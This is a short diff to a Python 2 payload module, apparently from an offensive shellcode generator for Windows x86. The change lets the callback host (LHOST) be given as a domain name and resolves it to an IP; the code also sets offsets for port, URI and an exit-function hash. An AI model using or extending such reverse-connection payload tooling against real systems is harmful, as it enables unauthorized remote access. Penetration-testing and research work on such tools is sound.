@@ -21,7 +21,16 @@ class PayloadModule:
         self.platform = "Windows"
         self.arch = "x86"
         self.lport = int(cli_arguments.port)
-        self.lhost = cli_arguments.ip   # '192.168.63.133\x00' this is encoded('string-escape') and appended to the end
+        # Check if given a domain or IP address:
+        if self.validate_ip(cli_arguments.ip):
+            self.lhost = cli_arguments.ip  # '192.168.63.133\x00' this is encoded('string-escape') and appended to the end
+        else:
+            try:
+                self.lhost = socket.gethostbyname(cli_arguments.ip)
+            except socket.gaierror:
+                print "[*] Error: Invalid domain or IP provided for LHOST value!"
+                print "[*] Error: Please re-run with the correct value."
+                sys.exit(1)
         self.lport_offset = 180  # This is actually going to be little endian
         self.uri_offset = 272
         self.exit_func = '\xf0\xb5\xa2\x56'
